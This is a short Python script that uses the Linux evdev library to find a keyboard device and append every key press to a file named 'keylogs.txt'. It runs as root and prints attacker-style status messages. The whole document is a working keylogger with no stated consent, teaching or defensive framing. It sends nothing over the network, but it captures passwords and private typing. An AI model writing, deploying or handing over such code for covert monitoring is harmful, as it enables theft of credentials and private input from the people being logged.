import evdev

log_file = "keylogs.txt"

# Find the keyboard device
def find_keyboard():
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for device in devices:
        if 'keyboard' in device.name.lower():
            return device
    return None

# Get keyboard device
keyboard = find_keyboard()
if keyboard is None:
    print("[-] No keyboard found. Make sure you're running as root.")
    exit()

print(f"[+] Listening for keystrokes on {keyboard.path}... Press Ctrl+C to stop.")

# Read key events
with open(log_file, "a") as f:
    for event in keyboard.read_loop():
        if event.type == evdev.ecodes.EV_KEY:
            key = evdev.categorize(event)
            if key.keystate == key.key_down:
                f.write(key.keycode + "\n")
                f.flush()

